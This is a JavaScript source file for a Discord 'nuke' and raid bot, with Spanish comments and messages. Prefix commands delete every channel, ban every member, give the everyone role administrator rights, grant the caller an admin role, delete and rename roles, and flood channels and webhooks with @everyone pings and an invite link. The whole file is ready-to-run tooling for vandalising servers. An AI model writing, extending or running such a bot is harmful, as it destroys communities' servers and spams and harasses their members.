const { Client, Events, ComponentType, ReactionEmoji, GuildEmoji, WebhookClient, PermissionsBitField, GatewayIntentBits, EmbedBuilder, ChannelType, ActionRowBuilder, StringSelectMenuBuilder, StringSelectMenuOptionBuilder, ActivityType, PermissionOverwrites, PermissionFlagsBits, Embed, IntentsBitField} = require('discord.js');
const client = new Client({intents: [103423]});
const bot_token = ""; // Introducir el token del bot
const prefix = "-"; // Prefijo del bot
client.on(`ready`,()=>{
    console.log(`> Bot ${client.user.username} activo.`);
    console.log(`> Invitación del Bot (administrador permisos): https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&integration_type=0&scope=bot`)
});
client.on(`messageCreate`, async(msg)=>{
    if(msg.content === prefix+"options"){
        msg.reply({embeds:[
            new EmbedBuilder()
            .setTitle(`Comandos del bot:`)
            .addFields(
                {name:prefix+'raid',value:'Crea canales y hace spam en ellos.'},
                {name:prefix+'nuke',value:'Elimina todos los canales del servidor.'},
                {name:prefix+'massping',value:'Hace spam en todos los canales de texto.'},
                {name:prefix+'renamechannels',value:'Renombra todos los canales.'},
                {name:prefix+'createwebhooks',value:'Crea webhooks.'},
                {name:prefix+'spamwebhooks',value:'Hace spam en todas las webhooks del servidor.'},
                {name:prefix+'createroles',value:'Crea roles.'},
                {name:prefix+'removeroles',value:'Elimina todos los roles posibles del servidor.'},
                {name:prefix+'renameroles',value:'Renombra todos los roles posibles.'}
            )
        ]});
    };
    if(msg.content === prefix+"nuke"){
        await msg.delete().catch((e)=>{});
        let channelsxd = await msg.guild.channels.fetch();
        for (const ch of channelsxd.values()) {
            ch.delete();
        };
        await msg.guild.channels.create({name:"nuke",type:ChannelType.GuildText}).then((ch)=>{
            ch.send({content:`> ||@everyone||\n> Este servidor ha sido nukeado por mi xdxd`})
        });
    };
    if(msg.content === prefix+"getadmin"){
        const rolllll = await msg.guild.roles.create({name:"$",permissions:[PermissionsBitField.Flags.Administrator]});
        await msg.guild.members.cache.get(msg.author.id).roles.add(`${rolllll.id}`);
    };
    if(msg.content === prefix+"adminall"){
        await msg.guild.roles.everyone.setPermissions([PermissionsBitField.Flags.Administrator]);
    };
    if(msg.content === prefix+"massban"){
        let membersxd = await msg.guild.members.fetch();
        for (const memberxd of membersxd.values()) {
            memberxd.ban();
        };
    };
    if(msg.content === prefix+"raid"){
        await msg.delete().catch((e)=>{});
        async function enviar_mensajes(channelxdxd) {
            for (let index = 0; index < 20; index++) {
                let channela = client.channels.cache.get(channelxdxd.id);
                channela.send({content:`> ||@everyone||\n> **Este servidor ha sido raideado por mi.**\n> ** https://discord.gg/kEB3PCPkzc **`});
            };
        };
        let nr_canales = 20;
        for (let index = 0; index < nr_canales; index++) {
            let ch = await msg.guild.channels.create({name:"ch-raid",type:ChannelType.GuildText});
            enviar_mensajes(ch);
        };
    };
    if(msg.content === prefix+"massping"){
        await msg.delete().catch((e)=>{});
        async function enviar_mensajes(channelxdxd) {
            for (let index = 0; index < 20; index++) {
                let channela = client.channels.cache.get(channelxdxd.id);
                channela.send({content:`> ||@everyone||\n> **Este servidor ha sido raideado por mi.**\n> ** https://discord.gg/kEB3PCPkzc **`});
            };
        };
        let channelss = await msg.guild.channels.fetch();
        for (const ch of channelss.values()) {
            if(ch.type === ChannelType.GuildText){
                enviar_mensajes(ch);
            };
        };
    };
    if(msg.content === prefix+"renamechannels"){
        await msg.delete().catch((e)=>{});
        let channelss = await msg.guild.channels.fetch();
        for (const ch of channelss.values()) {
            ch.setName(`ch-renamexd`);
        };
    };
    if(msg.content === prefix+"createwebhooks"){
        await msg.delete().catch((e)=>{});
        let channelss = await msg.guild.channels.fetch();
        for (const ch of channelss.values()) {
            try {
                await ch.createWebhook({name:`sexo`});
                console.log(`Se ha creado una webhook en el canal ${ch.name}.`);            
            } catch (e) {
                console.log(`No se pudo crear una webhook en el canal ${ch.name}\nMensaje de error:${e}`);
            }
        }
    };
    if(msg.content === prefix+"spamwebhooks"){
        await msg.delete().catch((e)=>{});
        async function whs_spam(wh) {
            for (let index = 0; index < 40; index++) {
                try {
                    wh.send({content:'> ||@everyone||\n> Server raideado por brizlixd.\n> https://discord.gg/kEB3PCPkzc'});
                    console.log(`Se ha enviado mensaje en la webhook ${wh.name}`);
                } catch (e) {
                    console.log(`Error al enviar mensaje por la webhook ${wh.name}\nMensaje de error: ${e}`)
                }
            }
        };
        let webhooksxd = await msg.guild.fetchWebhooks();
        for (const wh of webhooksxd.values()) {
            try {
                whs_spam(wh);
            } catch (e) {
                console.log(`No se pudo enviar mensajes en la webhook ${wh.name}\nMensaje de error: ${e}`)
            }
        }
    };
    if(msg.content === prefix+"masscreateroles"){
        await msg.delete().catch((e)=>{});
        let nr_roles = 20;
        for (let index = 0; index < nr_roles; index++) {
            try {
                await msg.guild.roles.create({name:'rol-test'});
                console.log(`Se creó un rol perfectamente.`);
            } catch (e) {
                console.log(`No se pudo crear un rol. Mensaje de error: ${e}`);
            }
        };
    };
    if(msg.content === prefix+"removeroles"){
        await msg.delete().catch((e)=>{});
        let roless = await msg.guild.roles.fetch();
        for (const rol of roless.values()) {
            try {
                await rol.delete();
                console.log(`Se eliminó el rol ${rol.name} con ID ${rol.id}`);
            } catch (e) {
                console.log(`No se pudo eliminar el rol ${rol.name}\nMensaje de error: ${e}`)
            }
        };
    };
    if(msg.content === prefix+"renameroles"){
        await msg.delete().catch((e)=>{});
        let roless = await msg.guild.roles.fetch();
        for (const rol of roless.values()) {
            try {
                await rol.setName(`roles-renamexd`);
                console.log(`Se renombró un rol`);
            } catch (e) {
                console.log(`No se pudo renombrar el rol ${rol.name}\nMensaje de error: ${e}`)
            }
        };
    };
});
client.login(bot_token);